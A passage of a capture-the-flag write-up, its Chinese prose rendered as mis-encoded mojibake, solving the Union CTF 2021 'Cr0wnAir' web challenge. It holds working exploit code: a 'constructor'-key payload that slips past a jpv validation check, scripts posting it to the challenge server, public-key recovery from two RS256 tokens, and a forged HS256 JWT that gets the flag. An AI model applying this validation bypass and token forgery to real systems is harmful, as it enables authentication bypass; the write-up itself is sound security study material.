<p>é€™èªªæ˜æˆ‘å€‘æ§‹é€ çš„è¼¸å…¥è¦†è“‹äº† constructor æœ€çµ‚å½±éŸ¿åˆ°äº† jpv çš„åˆ¤æ–·ã€‚æ¥ä¸‹ä¾†å…·é«”çœ‹çœ‹é™„ä»¶çµ¦çš„ç¨‹å¼ç¢¼ã€‚</p>
<p>åœ¨ checkin.js çš„ç¬¬ 45 è¡Œå¯ä»¥ç™¼ç¾å¦‚ä¸‹å…§å®¹ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&quot;</span>, <span class="string">&quot;token&quot;</span>: token&#125;;</span><br></pre></td></tr></table></figure>

<p>26 è¡Œè™•å¯ä»¥æ‰¾åˆ°é€™é¡Œ JWT çš„åŠ å¯†æ–¹å¼ RS256ã€‚å¦‚æœéœ€è¦å½é€  JWT å‰‡å¿…é ˆæƒ³è¾¦æ³•å…ˆæ‹¿åˆ° keyã€‚é€™è£¡å¯ä»¥ä½¿ç”¨ <a target="_blank" rel="noopener" href="https://github.com/silentsignal/rsa_sign2n">rsa_sig2n</a> é€é token å»ç®—å‡º keyï¼Œå› æ­¤è‡³å°‘è¦æ‹¿åˆ°å…©å€‹å¯ç”¨çš„ tokenã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> jwt.encode(body, config.privkey, <span class="string">&#x27;RS256&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>37 è¡Œè™•å¯ä»¥ç™¼ç¾å®ƒä½¿ç”¨åˆ°äº†ä¸Šè¿°é«˜å±æ¼æ´æ‰€å½±éŸ¿çš„æ–¹æ³•ï¼Œé¦–å…ˆå°‡é€™ä¸€éƒ¨åˆ†åˆ¤æ–·çš„ç¨‹å¼ç¢¼æ‘˜å‡ºä¾†ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (jpv.validate(data, pattern, &#123; <span class="attr">debug</span>: <span class="literal">true</span>, <span class="attr">mode</span>: <span class="string">&quot;strict&quot;</span> &#125;)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[<span class="string">&quot;firstName&quot;</span>] == <span class="string">&quot;Tony&quot;</span> &amp;&amp; data[<span class="string">&quot;lastName&quot;</span>] == <span class="string">&quot;Abbott&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in! Please remember not to post your boarding pass on social media.&quot;</span>&#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data[<span class="string">&quot;ffp&quot;</span>]) &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer.&quot;</span>&#125;;</span><br><span class="line">      <span class="keyword">for</span>(e <span class="keyword">in</span> data[<span class="string">&quot;extras&quot;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;extras&quot;</span>][e][<span class="string">&quot;sssr&quot;</span>] &amp;&amp; data[<span class="string">&quot;extras&quot;</span>][e][<span class="string">&quot;sssr&quot;</span>] === <span class="string">&quot;FQTU&quot;</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> token = createToken(data[<span class="string">&quot;passport&quot;</span>], data[<span class="string">&quot;ffp&quot;</span>]);</span><br><span class="line">          <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&quot;</span>, <span class="string">&quot;token&quot;</span>: token&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in!&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;Invalid checkin data provided, please try again.&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç™¼ç¾åœ¨é”æˆéƒ¨åˆ†æ¢ä»¶å¾Œå¯ä»¥æ‹¿åˆ°å¯ç”¨çš„ tokenã€‚ä½†æ˜¯èˆ‡æ­¤åŒæ™‚ï¼Œé€™å€‹æ¢ä»¶æ˜¯çœ‹ä¼¼ä¸å¯é”çš„ï¼Œå› ç‚ºæœ‰å¦‚ä¸‹çš„é©—è­‰æ©Ÿåˆ¶ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pattern = &#123;</span><br><span class="line">  firstName: <span class="regexp">/^\w&#123;1,30&#125;$/</span>,</span><br><span class="line">  lastName: <span class="regexp">/^\w&#123;1,30&#125;$/</span>,</span><br><span class="line">  passport: <span class="regexp">/^[0-9]&#123;9&#125;$/</span>,</span><br><span class="line">  ffp: <span class="regexp">/^(|CA[0-9]&#123;8&#125;)$/</span>,</span><br><span class="line">  extras: [</span><br><span class="line">    &#123;<span class="attr">sssr</span>: <span class="regexp">/^(BULK|UMNR|VGML)$/</span>&#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç™¼ç¾æ­¤æ™‚çš„ FQTU æ˜¯ä¸å¯èƒ½ç¬¦åˆé€™å€‹ pattern çš„å­—ä¸²ã€‚æ­¤æ™‚å°±éœ€è¦ä½¿ç”¨ä¸Šé¢çš„æ¼æ´ä¾†æ§‹é€  payloadã€‚é€éè§€å¯Ÿå¯çŸ¥é€™è£¡çš„ <code>extras</code> æ˜¯ä¸€å€‹æ•¸çµ„ï¼Œå…ˆæŒ‰ç…§åŸæœ‰çµæ§‹æ§‹é€ ä¸€ä¸‹ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">	firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">	ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">	extras: [</span><br><span class="line">		&#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ™‚å®ƒæ˜¯æ²’æ³•é€éæª¢æŸ¥çš„ï¼Œä½†æ˜¯ç•¶å®ƒè®Šæˆå¦‚ä¸‹çš„æ¨£å­ï¼Œå°±å¯ä»¥é€éé€™å€‹æª¢æŸ¥äº†ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">	firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">	ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">	extras: &#123;</span><br><span class="line">		<span class="string">&quot;e&quot;</span>: &#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;, </span><br><span class="line">		<span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ™‚æ§‹é€ çš„é€™å€‹ payload ç¬¦åˆäº†åˆ¤æ–·ä¸­çš„æ‰€æœ‰æ¢ä»¶ï¼Œå°‡å…¶æ”¾åˆ°è«‹æ±‚ä¸­å‚³é€å‡ºå»å¯ä»¥å¾—åˆ°æœ‰æ•ˆçš„ tokenã€‚é€™è£¡å¯«å€‹æŒ‡ä»¤ç¢¼ç²å–ä¸€ä¸‹ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">	firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">	ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">	extras: &#123;</span><br><span class="line">		<span class="string">&quot;e&quot;</span>: &#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;, </span><br><span class="line">		<span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">axios.post(<span class="string">&quot;http://34.105.202.19:3000/checkin&quot;</span>, data).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(res[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;token&quot;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>æ›´æ›ä¸€ä¸‹å¯è®Šçš„å¼•æ•¸å¾Œè«‹æ±‚å…©æ¬¡å¯ä»¥å¾—åˆ°å¦‚ä¸‹å…©å€‹æœ‰æ•ˆçš„ tokenã€‚</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg</span><br><span class="line"></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc2In0.B86GaaGsm7i1sbszIdebYCzleDwLO6CI3ZaM21wl4-dkN0wAOz8Y3U5r8ukwrA8SV0Mtm23wsTFzaem5BTUbxtw949IUdweaZHJ1IrV1oJKxtY5XrFmim9Od6UrAmG9MhArEG6FRGsXzHbJkcP3cnMWiKPvt71U26VYpYeuZ2dmhufKGh_sYycFN1BZWWsfTK9cbXAw8dMSSFUlrmFxedA-uUkKw-n3Bged_fBBLzeB55WYKa_bX99l1I5S7F4hh4GaU44_thXeQA7VmxNIvRFusKdg7z7zcf3MA981JB1Pjgb2jMQdS7ktMyrP6VhZrJMcQ2EWKv65MpzCj-fB-Ag</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä¸Šé¢æåˆ°çš„ rsa_sig2n å·¥å…·å¯ä»¥å¾—åˆ°å¦‚ä¸‹å…¬é‘°ã€‚</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw5lfZkrAzBjl2uf2bF4q</span><br><span class="line">uWzPbmEzcsjVGwEePrj3tQh2gQWMw7HOvNNqVMWbuyK0VYWyk&#x2F;EJ2IXkrV+R7yz1</span><br><span class="line">ROFf2gMH6MRcdVakQF0MQJVRGOmwAIxi+Y7X3fo8HsjJVzzEk4Xy+nWTGS&#x2F;FuNSW</span><br><span class="line">+n0ch81nlZykurVcDKTS7zxPjOtkOswfypoqZyEJ8Uyn32VgWcZ1IK4CB1m9Za0j</span><br><span class="line">DLU30ohyT3e3GUWT+qkUSiaHtMTViq8CxSMzlfFC1ASmAT1wGE+&#x2F;rcUtTPvVKmh0</span><br><span class="line">fTO2sqEsCQp2MGzKk8K1IhwdvuaXqgOFGIcBbaqMwKjpXIfTJSIb7rwEy&#x2F;i3N9y8</span><br><span class="line">CwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>

<p>è‡³æ­¤æˆåŠŸæ‹¿åˆ°äº†é¡Œç›®ç·¨ç¢¼ JWT æ‰€ç”¨çš„å…¬é‘°ã€‚ç¹¼çºŒå¯©è¨ˆç¨‹å¼ç¢¼ï¼Œå¯ä»¥åœ¨ upgrades.js ä¸‹ç™¼ç¾å¦‚ä¸‹ç¨‹å¼ç¢¼ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/flag&#x27;</span>, [getLoyaltyStatus], <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (res.locals.token &amp;&amp; res.locals.token.status == <span class="string">&quot;gold&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: config.flag &#125;;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You do not qualify for this upgrade at this time. Please fly with us more.&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>æ­¤æ™‚åªéœ€è¦å½é€ ä¸€æ®µ JWT ä½¿å…¶ status æ»¿è¶³è¦æ±‚å³å¯ã€‚é€™è£¡ä½¿ç”¨èˆŠç‰ˆçš„åŒ… <code>pyjwt==0.4.3</code> å»ç”Ÿæˆä¸€å€‹ HS256 æ¼”ç®—æ³•çš„ tokenã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">key = <span class="built_in">open</span>(<span class="string">&quot;c3995f664ac0cc18_65537_x509.pem&quot;</span>).read()</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;gold&quot;</span>&#125;, key, <span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>

<p>å†ç”¨ axios å»è«‹æ±‚ï¼Œå¯å¾—åˆ° flagã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>)</span><br><span class="line"></span><br><span class="line">axios(&#123;</span><br><span class="line">	method: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">	url: <span class="string">&quot;http://34.105.202.19:3000/upgrades/flag&quot;</span>,</span><br><span class="line">	headers: &#123;</span><br><span class="line">		<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiJnb2xkIn0.aMSl9yfOJoNV3Xzd0vZqhTRgxNrII_iXt6k5w6P1g3E&quot;</span></span><br><span class="line">	&#125;&#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(res[<span class="string">&quot;data&quot;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;I_&lt;3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N&#125;</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">é¦–é </a></li>
         
          <li><a href="/archives/">æ–‡ç« </a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">å·¥å…·</a></li>
         
          <li><a href="/about/">é—œæ–¼</a></li>
         
          <li><a href="/search/">æœå°‹</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%91-Welcome-%F0%9F%91%91"><span class="toc-number">1.1.</span> <span class="toc-text">ğŸ‘‘ Welcome ğŸ‘‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bashlex"><span class="toc-number">1.2.</span> <span class="toc-text">bashlex</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Meet-the-Union-Committee"><span class="toc-number">2.1.</span> <span class="toc-text">Meet the Union Committee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cr0wnAir"><span class="toc-number">2.2.</span> <span class="toc-text">Cr0wnAir</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&text=Union CTF 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&is_video=false&description=Union CTF 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Union CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&name=Union CTF 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&t=Union CTF 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> é¸å–®</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> æ–‡ç« ç›®éŒ„</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> åˆ†äº«</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> é é¦–</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/zh-TW/">é¦–é </a></li>
         
          <li><a href="/zh-TW/archives/">æ–‡ç« </a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">å·¥å…·</a></li>
         
          <li><a href="/about/">é—œæ–¼</a></li>
         
          <li><a href="/search/">æœå°‹</a></li>
        
        
        
        <li>
        
          <a href="/zh-CN">ç®€</a>
        
          <a href="/en">En</a>
        
          <a href="#">æ­£</a>
        
        </li>
      </ul>
    </nav>
  </div>
  <div class="footer-left">
    Copyright &copy;
    
    
    2018-2021
    LemonPrefect
    
      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">æ¹˜ICPå¤‡20002800å·</a>
    
    
      <img src="/images/beian.png"/>
      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">æ¹˜å…¬ç½‘å®‰å¤‡43021102000188å·</a>
    
    
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"å¤åˆ¶åˆ°ç²˜è´´æ¿!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "å¤åˆ¶æˆåŠŸ!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
